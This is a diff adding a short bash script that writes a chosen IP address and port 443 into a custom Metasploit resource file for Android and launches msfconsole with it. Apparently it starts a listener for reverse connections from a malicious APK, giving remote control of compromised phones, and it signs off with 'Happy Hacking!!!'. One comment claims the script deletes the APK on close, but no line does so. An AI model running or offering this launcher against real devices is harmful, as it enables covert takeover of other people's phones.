@@ -1,0 +1,15 @@
+#!/bin/bash
+# Script made by Aaron Vigal. http://www.aaronvigal.com
+
+read -p "What is the IP Address to listen on? " internalip;
+port="443"
+
+# Replace the new variables in the custom metasploit script
+sed -i '4s/.*/set lhost '$internalip'/' /root/Desktop/Metasploit/Android/android.rb
+sed -i '5s/.*/set lport '$port'/' /root/Desktop/Metasploit/Android/android.rb
+
+# Execute the newly updated script (android.rb)
+msfconsole -r /root/Desktop/Metasploit/Android/android.rb
+
+# Delete the APK on close and say goodbye
+echo "From the wise words of Kevin Dickerson...";echo "Get lit.";echo "Get good.";echo "Party hard.";echo "";echo "Happy Hacking!!!";echo ""
